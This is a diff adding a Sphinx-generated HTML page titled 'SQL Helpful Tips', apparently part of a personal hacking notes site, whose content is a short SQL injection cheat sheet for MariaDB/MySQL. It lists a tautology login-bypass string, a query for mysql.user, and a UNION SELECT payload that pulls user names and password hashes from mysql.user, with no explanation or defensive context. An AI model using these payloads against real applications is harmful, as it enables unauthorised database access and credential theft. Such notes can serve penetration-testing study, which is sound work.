@@ -1,0 +1,131 @@
+
+
+<!doctype html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
+
+    <title>SQL Helpful Tips &#8212; Documentation 0.1 documentation</title>
+    <link rel="stylesheet" type="text/css" href="../_static/pygments.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/bizstyle.css" />
+    
+    <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js"></script>
+    <script src="../_static/jquery.js"></script>
+    <script src="../_static/underscore.js"></script>
+    <script src="../_static/doctools.js"></script>
+    <script src="../_static/bizstyle.js"></script>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+    <link rel="next" title="NMAP cheatsheat" href="nmap.html" />
+    <link rel="prev" title="Hacking Home Page" href="index.html" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <!--[if lt IE 9]>
+    <script src="_static/css3-mediaqueries.js"></script>
+    <![endif]-->
+  </head><body>
+    <div class="related" role="navigation" aria-label="related navigation">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="../genindex.html" title="General Index"
+             accesskey="I">index</a></li>
+        <li class="right" >
+          <a href="nmap.html" title="NMAP cheatsheat"
+             accesskey="N">next</a> |</li>
+        <li class="right" >
+          <a href="index.html" title="Hacking Home Page"
+             accesskey="P">previous</a> |</li>
+        <li class="nav-item nav-item-0"><a href="../index.html">Documentation 0.1 documentation</a> &#187;</li>
+          <li class="nav-item nav-item-1"><a href="index.html" accesskey="U">Hacking Home Page</a> &#187;</li>
+        <li class="nav-item nav-item-this"><a href="">SQL Helpful Tips</a></li> 
+      </ul>
+    </div>  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          <div class="body" role="main">
+            
+  <section id="sql-helpful-tips">
+<h1>SQL Helpful Tips<a class="headerlink" href="#sql-helpful-tips" title="Permalink to this headline">¶</a></h1>
+<section id="display-current-table">
+<h2>Display current table<a class="headerlink" href="#display-current-table" title="Permalink to this headline">¶</a></h2>
+<p>maria-db/MySQL</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">1&#39; or 1=1 --&#39;</span>
+</pre></div>
+</div>
+<p>#Lists users</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">SELECT user FROM mysql.user; — priv</span>
+<span class="go">10&#39; UNION SELECT user,password,3 from mysql.user;-- -</span>
+</pre></div>
+</div>
+</section>
+</section>
+
+
+            <div class="clearer"></div>
+          </div>
+        </div>
+      </div>
+      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
+        <div class="sphinxsidebarwrapper">
+  <h3><a href="../index.html">Table of Contents</a></h3>
+  <ul>
+<li><a class="reference internal" href="#">SQL Helpful Tips</a><ul>
+<li><a class="reference internal" href="#display-current-table">Display current table</a></li>
+</ul>
+</li>
+</ul>
+
+  <h4>Previous topic</h4>
+  <p class="topless"><a href="index.html"
+                        title="previous chapter">Hacking Home Page</a></p>
+  <h4>Next topic</h4>
+  <p class="topless"><a href="nmap.html"
+                        title="next chapter">NMAP cheatsheat</a></p>
+  <div role="note" aria-label="source link">
+    <h3>This Page</h3>
+    <ul class="this-page-menu">
+      <li><a href="../_sources/hacking/SQL.rst.txt"
+            rel="nofollow">Show Source</a></li>
+    </ul>
+   </div>
+<div id="searchbox" style="display: none" role="search">
+  <h3 id="searchlabel">Quick search</h3>
+    <div class="searchformwrapper">
+    <form class="search" action="../search.html" method="get">
+      <input type="text" name="q" aria-labelledby="searchlabel" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"/>
+      <input type="submit" value="Go" />
+    </form>
+    </div>
+</div>
+<script>$('#searchbox').show(0);</script>
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="related" role="navigation" aria-label="related navigation">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="../genindex.html" title="General Index"
+             >index</a></li>
+        <li class="right" >
+          <a href="nmap.html" title="NMAP cheatsheat"
+             >next</a> |</li>
+        <li class="right" >
+          <a href="index.html" title="Hacking Home Page"
+             >previous</a> |</li>
+        <li class="nav-item nav-item-0"><a href="../index.html">Documentation 0.1 documentation</a> &#187;</li>
+          <li class="nav-item nav-item-1"><a href="index.html" >Hacking Home Page</a> &#187;</li>
+        <li class="nav-item nav-item-this"><a href="">SQL Helpful Tips</a></li> 
+      </ul>
+    </div>
+    <div class="footer" role="contentinfo">
+        &#169; Copyright 2021, Steven Latino.
+      Created using <a href="https://www.sphinx-doc.org/">Sphinx</a> 4.3.0.
+    </div>
+  </body>
+</html>
